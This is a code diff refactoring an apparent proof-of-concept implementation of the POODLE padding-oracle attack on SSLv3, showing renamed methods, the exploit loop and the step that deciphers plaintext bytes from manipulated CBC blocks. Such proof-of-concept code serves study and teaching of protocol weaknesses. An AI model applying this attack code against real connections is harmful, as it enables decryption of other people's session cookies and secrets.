@@ -81,7 +81,7 @@ class Client:
         self.socket = ssl_sock
         return
     
-    def request_cookie(self, path=0, data=0):
+    def request(self, path=0, data=0):
         srt_path = ''
         srt_data = ''
         for x in range(0,path):
@@ -191,12 +191,11 @@ class Poodle(Client):
         self.client = client
         self.length_block = 0
         self.start_exploit = False
-        self.nb_prefix = 0
         self.decipherable = False
         self.request = ''
         self.byte_decipher = 0
 
-    def poodle_attack(self):
+    def run(self):
         self.client_connection()
         self.size_of_block()
         self.start_exploit = True
@@ -210,15 +209,9 @@ class Poodle(Client):
         self.client_disconect()
         return
 
-    def get_start_exploit(self):
-        return self.start_exploit
-
-    def set_length_frame(self, data):
-        self.frame = data
-        self.length_frame = len(data)
-
     def exploit(self):
-        # start at block 2, finish at block n-2
+        # start at block 1, finish at block n-2
+        # 0 => IV unknow, n => padding block, n-1 => MAC block
         length_f = self.length_frame
         for i in range(1,(length_f/self.length_block) - 1):
             self.current_block = i
@@ -239,11 +232,12 @@ class Poodle(Client):
         print ''
         while True:
             self.client_connection()
-            time.sleep(0.0001)
             prefix_length = byte
             suffix_length = self.length_block - byte           
             
             self.send_request_from_the_client(self.length_block+self.nb_prefix+prefix_length, suffix_length)
+            # sleep to avoid "connection reset by peer" on macintosh
+            time.sleep(0.0001)
             self.client_disconect()          
             if self.decipherable is True:
                 self.byte_decipher += 1
@@ -254,13 +248,6 @@ class Poodle(Client):
             sys.stdout.write("\rclient's request %4s" % (nb_request))
             sys.stdout.flush()
         return (chr(plain), nb_request)
-
-    def decipher(self, data):
-        return self.choosing_block(self.current_block-1)[-1] ^ self.choosing_block(-2)[-1] ^ (self.length_block-1)
-
-    def set_decipherable(self, status):
-        self.decipherable = status
-        return
 
     def size_of_block(self):
         print "Begins searching the size of a block...\n"
@@ -278,6 +265,9 @@ class Poodle(Client):
             i += 1
         self.decipherable = False
 
+    def decipher(self, data):
+        return self.choosing_block(self.current_block-1)[-1] ^ self.choosing_block(-2)[-1] ^ (self.length_block-1)
+
     def alter(self):
         if self.start_exploit is True:
             self.frame = bytearray(self.frame)
@@ -285,12 +275,23 @@ class Poodle(Client):
             return str(self.frame)
         return self.frame
 
+    def set_decipherable(self, status):
+        self.decipherable = status
+        return
+
+    def get_start_exploit(self):
+        return self.start_exploit
+
+    def set_length_frame(self, data):
+        self.frame = data
+        self.length_frame = len(data)
+
     def client_connection(self):
         self.client.connection()
         return
 
     def send_request_from_the_client(self, path=0, data=0):
-        self.client.request_cookie(path,data)
+        self.client.request(path,data)
         return
 
     def client_disconect(self):
@@ -331,7 +332,7 @@ if __name__ == '__main__':
     server.connection()
     spy.connection()
 
-    poodle.poodle_attack()
+    poodle.run()
 
     spy.disconnect()
     server.disconnect()
